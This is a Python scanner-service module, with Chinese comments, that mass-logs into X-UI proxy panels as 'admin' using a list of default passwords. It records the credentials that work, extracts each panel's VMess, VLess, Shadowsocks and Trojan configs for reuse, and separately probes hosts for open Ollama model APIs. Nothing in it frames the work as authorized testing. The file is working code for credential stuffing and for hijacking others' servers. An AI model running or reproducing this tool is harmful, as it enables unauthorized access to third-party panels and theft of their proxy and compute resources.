# services/scanner_service.py (修复代理格式生成)
import asyncio
import aiohttp
import json
import yaml
import logging
import base64
import urllib.parse
from typing import List, Dict, Any, Callable, Optional, Tuple
from config import config
from data_manager import data_manager

logger = logging.getLogger(__name__)

class ScannerService:
    """统一的扫描服务 - 使用异步提升性能"""
    
    def __init__(self):
        self.session = None
        self.check_count = config.DEFAULT_CHECK_COUNT
        self.passwords = config.DEFAULT_PASSWORDS.copy()
    
    async def __aenter__(self):
        """异步上下文管理器入口"""
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10)
        timeout = aiohttp.ClientTimeout(total=config.REQUEST_TIMEOUT)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """异步上下文管理器退出"""
        if self.session:
            await self.session.close()
    
    async def scan_xui_batch(self, urls: List[str], 
                           progress_callback: Optional[Callable] = None,
                           cancel_flag: Optional[Dict] = None) -> Dict[str, Any]:
        """批量扫描XUI面板"""
        if len(urls) > self.check_count:
            urls = urls[:self.check_count]
        
        results = {
            'successful_logins': [],
            'new_proxies': [],
            'total_scanned': len(urls),
            'success_count': 0
        }
        
        semaphore = asyncio.Semaphore(10)
        
        async def scan_single_url(index: int, url: str) -> Tuple[bool, str]:
            async with semaphore:
                if cancel_flag and cancel_flag.get('cancelled'):
                    return False, "已取消"
                
                if progress_callback:
                    await progress_callback(index + 1, len(urls), url)
                
                return await self._scan_xui_single(url, results)
        
        tasks = [scan_single_url(i, url) for i, url in enumerate(urls)]
        scan_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        results['success_count'] = sum(1 for success, _ in scan_results 
                                     if isinstance(success, bool) and success)
        
        return results
    
    async def _scan_xui_single(self, url: str, results: Dict) -> Tuple[bool, str]:
        """扫描单个XUI地址"""
        try:
            if not url.startswith(('http://', 'https://')):
                url = f"http://{url}"
            
            if ':' not in url.split('//')[-1]:
                url += ":54321"
            
            for password in self.passwords:
                login_success, cookie = await self._try_login(url, password)
                if login_success:
                    results['successful_logins'].append(f"{url} admin,{password}")
                    
                    proxies = await self._get_xui_proxies(url, cookie)
                    if proxies:
                        results['new_proxies'].extend(proxies)
                    
                    return True, f"登录成功: {url}"
            
            return False, f"登录失败: {url}"
            
        except Exception as e:
            logger.error(f"扫描XUI失败 {url}: {e}")
            return False, f"扫描失败: {str(e)}"
    
    async def _try_login(self, url: str, password: str) -> Tuple[bool, Optional[str]]:
        """尝试登录XUI面板"""
        login_data = {
            "username": "admin",
            "password": password
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/plain, */*'
        }
        
        try:
            async with self.session.post(f'{url}/login', 
                                       data=login_data, 
                                       headers=headers) as response:
                if response.status == 200:
                    result = await response.json()
                    if result.get("success"):
                        cookie = response.headers.get('Set-Cookie')
                        return True, cookie
                
                return False, None
                
        except Exception as e:
            logger.debug(f"登录失败 {url}: {e}")
            return False, None
    
    async def _get_xui_proxies(self, url: str, cookie: str) -> List[Dict[str, Any]]:
        """获取XUI代理配置"""
        if not cookie:
            return []
        
        headers = {
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15',
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept': 'application/json, text/plain, */*'
        }
        
        try:
            async with self.session.post(f'{url}/xui/inbound/list', 
                                       headers=headers) as response:
                if response.status == 200:
                    result = await response.json()
                    if result.get("success"):
                        return self._parse_xui_response(result, url)
                
                return []
                
        except Exception as e:
            logger.error(f"获取XUI配置失败 {url}: {e}")
            return []
    
    def _parse_xui_response(self, response: Dict, base_url: str) -> List[Dict[str, Any]]:
        """解析XUI响应，生成代理配置"""
        proxies = []
        server_ip = base_url.split('://')[1].split(':')[0]
        
        for item in response.get("obj", []):
            if not (item.get("enable") and item.get("expiryTime") == 0):
                continue
            
            protocol = item.get("protocol")
            proxy_config = None
            
            name = f"US| {server_ip}:{item['port']}"
            
            if protocol == "vmess":
                proxy_config = self._create_vmess_config(item, server_ip, name)
            elif protocol == "vless":
                proxy_config = self._create_vless_config(item, server_ip, name)
            elif protocol == "shadowsocks":
                proxy_config = self._create_ss_config(item, server_ip, name)
            elif protocol == "trojan":
                proxy_config = self._create_trojan_config(item, server_ip, name)
            
            if proxy_config:
                existing_proxies = data_manager.load_proxies()
                if not any(p.get('name') == name for p in existing_proxies):
                    proxies.append(proxy_config)
        
        return proxies
    
    def _create_vmess_config(self, item: Dict, server: str, name: str) -> Dict[str, Any]:
        """创建VMess配置"""
        settings = json.loads(item.get("settings", "{}"))
        stream_settings = json.loads(item.get("streamSettings", "{}"))
        
        config = {
            'name': name,
            'type': 'vmess',
            'server': server,
            'port': item["port"],
            'uuid': settings.get("clients", [{}])[0].get("id"),
            'alterId': 0,
            'cipher': 'none',
            'network': stream_settings.get("network", 'tcp'),
            'tls': False,
            'udp': False
        }
        
        if config['network'] == "ws":
            config.update({
                'path': stream_settings.get("wsSettings", {}).get("path", "/"),
                'headerType': 'none'
            })
        
        return config
    
    def _create_vless_config(self, item: Dict, server: str, name: str) -> Dict[str, Any]:
        """创建VLess配置"""
        settings = json.loads(item.get("settings", "{}"))
        stream_settings = json.loads(item.get("streamSettings", "{}"))
        
        return {
            'name': name,
            'type': 'vless',
            'server': server,
            'port': item["port"],
            'uuid': settings.get("clients", [{}])[0].get("id"),
            'network': stream_settings.get("network", 'tcp'),
            'security': 'none'
        }
    
    def _create_ss_config(self, item: Dict, server: str, name: str) -> Dict[str, Any]:
        """创建Shadowsocks配置"""
        settings = json.loads(item.get("settings", "{}"))
        
        return {
            'name': name,
            'type': 'ss',
            'server': server,
            'port': item["port"],
            'cipher': settings.get("method", "aes-256-gcm"),
            'password': settings.get("password", ""),
            'udp': True
        }
    
    def _create_trojan_config(self, item: Dict, server: str, name: str) -> Dict[str, Any]:
        """创建Trojan配置"""
        settings = json.loads(item.get("settings", "{}"))
        
        return {
            'name': name,
            'type': 'trojan',
            'server': server,
            'port': item["port"],
            'password': settings.get("clients", [{}])[0].get("password", ""),
            'sni': '',
            'udp': True
        }
    
    async def scan_ollama_batch(self, urls: List[str], 
                              progress_callback: Optional[Callable] = None,
                              cancel_flag: Optional[Dict] = None) -> Dict[str, Any]:
        """批量扫描Ollama API"""
        if len(urls) > self.check_count:
            urls = urls[:self.check_count]
        
        results = {
            'successful_urls': [],
            'total_scanned': len(urls),
            'success_count': 0
        }
        
        semaphore = asyncio.Semaphore(20)
        
        async def scan_single_url(index: int, url: str) -> bool:
            async with semaphore:
                if cancel_flag and cancel_flag.get('cancelled'):
                    return False
                
                if progress_callback:
                    await progress_callback(index + 1, len(urls), url)
                
                success = await self._check_ollama_api(url)
                if success:
                    results['successful_urls'].append(url)
                return success
        
        tasks = [scan_single_url(i, url) for i, url in enumerate(urls)]
        scan_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        results['success_count'] = sum(1 for result in scan_results 
                                     if isinstance(result, bool) and result)
        
        return results
    
    async def _check_ollama_api(self, url: str) -> bool:
        """检查Ollama API是否可用"""
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        
        try:
            async with self.session.get(f'{url}/v1/models', 
                                      headers={'Authorization': 'Bearer aaa'}) as response:
                return response.status == 200
        except Exception:
            return False